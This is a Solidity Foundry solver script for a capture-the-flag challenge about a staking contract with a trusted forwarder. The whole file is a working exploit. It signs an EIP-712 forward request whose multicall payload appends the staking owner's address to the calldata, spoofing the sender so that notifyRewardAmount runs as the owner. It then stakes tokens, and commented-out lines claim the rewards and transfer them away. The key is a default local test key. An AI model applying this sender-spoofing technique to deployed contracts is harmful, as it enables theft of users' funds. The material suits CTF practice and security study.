// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.4;

import "forge-ctf/CTFSolver.sol";
import "forge-std/console.sol";

import {Challenge} from "src/Challenge.sol";
import {Token} from "src/Token.sol";
import {Forwarder} from "src/Forwarder.sol";
import {Staking, Multicall} from "src/Staking.sol";

contract Solve is CTFSolver {
    function solve(address challenge_, address player) internal override {
        Challenge challenge = Challenge(challenge_);

        console.log("solved?", challenge.isSolved());

        uint256 playerPrivateKey =
            vm.envOr("PLAYER", uint256(0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80));

        Staking staking = challenge.staking();
        Forwarder forwarder = challenge.forwarder();
        Token token = staking.stakingToken();
        Token reward = staking.rewardsToken();

        bytes32 domain;

        {
            bytes32 hashedName = keccak256(bytes("Forwarder"));
            bytes32 hashedVersion = keccak256(bytes("1"));
            bytes32 typeHash =
                keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)");
            domain = _buildDomainSeparator(typeHash, hashedName, hashedVersion, address(forwarder));
        }

        bytes[] memory results = new bytes[](1);
        results[0] = abi.encodePacked(
            abi.encodeWithSelector(Staking.notifyRewardAmount.selector, type(uint80).max - 80805789176501875060285),
            staking.owner()
        );

        bytes memory multicall = abi.encodeWithSelector(Multicall.multicall.selector, results);

        Forwarder.ForwardRequest memory req = Forwarder.ForwardRequest({
            from: player,
            to: address(staking),
            value: 0,
            gas: 1_000_000,
            nonce: 0,
            deadline: type(uint256).max,
            data: multicall
        });

        bytes32 structHash = keccak256(
            abi.encode(
                keccak256(
                    "ForwardRequest(address from,address to,uint256 value,uint256 gas,uint256 nonce,uint256 deadline,bytes data)"
                ),
                req.from,
                req.to,
                req.value,
                req.gas,
                req.nonce,
                req.deadline,
                keccak256(req.data)
            )
        );

        {
            bytes32 digest = toTypedDataHash(domain, structHash);

            (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPrivateKey, digest);

            bytes memory signature = abi.encodePacked(r, s, v);

            forwarder.execute(req, signature);
        }

        token.approve(address(staking), type(uint256).max);
        staking.stake(100 * 10 ** 18);

        // UNCOMMENT ABOVE FORST FIRST PART, AND SECOND PART BELOW

        // staking.getReward();
        // reward.transfer(address(0x123), reward.balanceOf(player));

        // staking.earnedTotal();
        // staking.rewardsToken().balanceOf(address(0x123));

        console.log("solved?", challenge.isSolved());
    }

    function _buildDomainSeparator(bytes32 typeHash, bytes32 nameHash, bytes32 versionHash, address addr)
        private
        view
        returns (bytes32)
    {
        return keccak256(abi.encode(typeHash, nameHash, versionHash, block.chainid, addr));
    }

    function toTypedDataHash(bytes32 domainSeparator, bytes32 structHash) internal pure returns (bytes32 digest) {
        assembly {
            let ptr := mload(0x40)
            mstore(ptr, hex"1901")
            mstore(add(ptr, 0x02), domainSeparator)
            mstore(add(ptr, 0x22), structHash)
            digest := keccak256(ptr, 0x42)
        }
    }
}
